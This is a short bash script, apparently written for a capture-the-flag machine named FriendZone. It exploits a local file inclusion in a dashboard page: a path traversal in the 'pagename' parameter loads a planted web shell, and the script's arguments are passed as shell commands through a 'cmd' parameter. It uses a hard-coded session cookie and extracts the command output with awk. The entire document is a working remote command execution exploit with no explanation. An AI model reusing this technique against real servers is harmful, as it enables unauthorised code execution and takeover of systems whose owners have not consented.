#!/bin/bash

curl -skGH 'Cookie: FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1' 'https://administrator1.friendzone.red/dashboard.php' --data 'image_id=x' --data 'pagename=../../../../../etc/Development/ws' --data-urlencode cmd="$*" | awk -F'</center>' '{print $5}'
